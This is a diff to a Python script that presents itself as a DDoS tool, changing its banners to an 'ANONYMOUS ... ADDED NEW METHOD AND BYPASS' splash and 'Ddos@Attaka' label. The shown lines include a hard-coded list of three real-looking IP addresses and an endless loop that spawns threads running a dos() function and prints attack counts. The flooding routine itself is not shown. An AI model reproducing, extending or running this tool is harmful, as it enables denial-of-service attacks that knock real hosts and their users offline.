@@ -10,19 +10,16 @@ os.system("clear")
 print("З А Г Р У З К А....")
 time.sleep(2.5)
 os.system("clear")
-print('''
-    KAZUYA AND TEAM
- 
-╭╮╭━╮
-┃┃┃╭╯
-┃╰╯╯╭━━┳━━━┳╮╭┳╮╱╭┳━━╮
-┃╭╮┃┃╭╮┣━━┃┃┃┃┃┃╱┃┃╭╮┃
-┃┃┃╰┫╭╮┃┃━━┫╰╯┃╰━╯┃╭╮┃
-╰╯╰━┻╯╰┻━━━┻━━┻━╮╭┻╯╰╯
-╱╱╱╱╱╱╱╱╱╱╱╱╱╱╭━╯┃
-╱╱╱╱╱╱╱╱╱╱╱╱╱╱╰━━╯
-                                
-''')
+
+print("""
+     __      ANONYMOUS       _____
+    / /  __ _ _   _  ___ _  |___  |
+   / /  / _` | | | |/ _ \ '__| / /
+  / /__| (_| | |_| |  __/ |   / /
+  \____/\__,_|\__, |\___|_|  /_/
+              |___/
+  ADDED NEW METHOD AND BYPASS 
+""")
 print("Ddos@Attaka")
 
 time.sleep(2.5)
@@ -39,7 +36,6 @@ try:
 except:
     pass
 
-# http://m.bibika.ru/
 
 ips = ['217.160.0.137', '212.164.222.45', '176.59.131.203']
 
@@ -94,5 +90,5 @@ def dos():
 
 while True:
     threading.Thread(target=dos).start()
-    print(f'Send ping to {target}:{port}')
     print(f'Numbers of attack: {attack_num}')
+    print(colored("[!] sent %s Target: %s" % (sent, ip), 'yellow'))
